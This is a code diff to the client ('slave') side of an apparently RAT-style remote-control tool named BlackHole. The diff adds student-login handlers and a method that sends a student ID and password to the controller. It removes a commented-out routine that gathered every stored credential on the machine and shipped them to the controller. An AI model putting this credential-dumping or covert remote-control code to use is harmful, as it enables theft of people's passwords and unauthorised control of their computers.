@@ -13,6 +13,7 @@ using NetMQ;
 using NetMQ.Sockets;
 using System.Collections.Generic;
 using System.Threading;
+using System.Windows.Forms;
 
 namespace BlackHole.Slave
 {
@@ -166,6 +167,8 @@ namespace BlackHole.Slave
                 .With<KillProcessMessage>(KillProcess)
                 .With<ShutdownRemoteMessage>(Shutdown)
                 .With<RebootRemoteMessage>(Reboot)
+                .With<LoginSuccessMessage>(LoginSuccess)
+                .With<LoginFailMessage>(LoginFail)
                 .Default(m => SendFailedStatus(message.WindowId, "Message parsing", $"Unknow message {m.GetType().Name}"));
 
     #if DEBUG
@@ -430,34 +433,7 @@ namespace BlackHole.Slave
             }, message.FilePath);
         }
 
-        /// <summary>
-        /// 
-        /// </summary>
-        /// <param name="message"></param>
-        /*
-        private void DumpCredentials(StartCredentialsMessage message)
-        {
-            SendStatus(message.WindowId, "Credentials", "Started");
-
-            Task.Factory.StartNew(() =>
-            {
-                try
-                {
-                    var credentialsMessage = new CredentialsMessage(
-                        LibCredentials.LibCredentials.GetAllCredentialsAsDictionaries());
-
-                    ExecuteComplexSendOperation(message.WindowId,
-                        "Credentials",
-                        () => credentialsMessage);
-                }
-                catch
-                {
-                    // cancelled
-                    SendStatus(message.WindowId, "Credentials", "Ended");
-                }
-            });
-        }
-        */
+        
 
         private void DoWork(StartTasksMessage message, CancellationToken token)
         {
@@ -527,7 +503,30 @@ namespace BlackHole.Slave
             Process.Start(psi);
         }
 
+        private void LoginSuccess(LoginSuccessMessage message)
+        {
+            LoginProtect.TimeStop();
+            App.Current.MainWindow.Hide();
+        }
 
+        private void LoginFail(LoginFailMessage message)
+        {
+            MessageBox.Show("Student ID or Password incorrect!");
+        }
+
+        public void RequestLogin(string stuid, string password)
+        {
+            Send(new LoginMessage
+            {
+                stuid = stuid,
+                password = password
+            });
+        }
+
+        private void CancelLoginProtect()
+        {
+
+        }
 
         /// <summary>
         /// 
